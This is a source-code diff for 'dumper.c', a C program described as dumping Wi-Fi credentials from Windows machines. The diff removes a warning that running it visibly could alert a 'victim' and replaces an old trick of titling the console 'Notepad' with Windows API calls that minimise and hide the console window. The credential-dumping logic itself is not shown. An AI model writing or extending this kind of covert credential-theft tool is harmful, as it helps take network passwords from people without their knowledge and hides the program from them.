@@ -2,8 +2,8 @@
  * @file dumper.c
  * @author Francisco Spínola (fssecur3@outlook.com)
  * @brief Dump Wi-Fi credentials from Windows machines (needs admin privileges)
- * @version 0.3
- * @date 2021-03-10
+ * @version 0.4
+ * @date 19/08/2021
  * @copyright Copyright (c) 2021
  * 
  * DESCRIPTION
@@ -17,15 +17,16 @@
  * 
  * EXECUTION
  * You can execute the program on a terminal or by double clicking the executable.
- * 
- * WARNING
- * Careful when double clicking, since you will spawn a GUI and that can warn a "victim" of what's happening.
  */
+
+#define _WIN32_WINNT 0x0500
 
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <stdbool.h>
+#include <time.h>
+#include <windows.h>
 
 #define SSID 32
 #define BUFFER 59
@@ -153,9 +154,9 @@ bool checkAdmin () {
 
 //Main
 int main(int argc, char **argv) {
-    system("mode con:cols=15 lines=1");
-    system("color f0");
-    system("title Notepad");
+    HWND hWnd = GetConsoleWindow();
+    ShowWindow( hWnd, SW_MINIMIZE );
+    ShowWindow( hWnd, SW_HIDE );
 
     if (!checkAdmin()) {
         return -1;
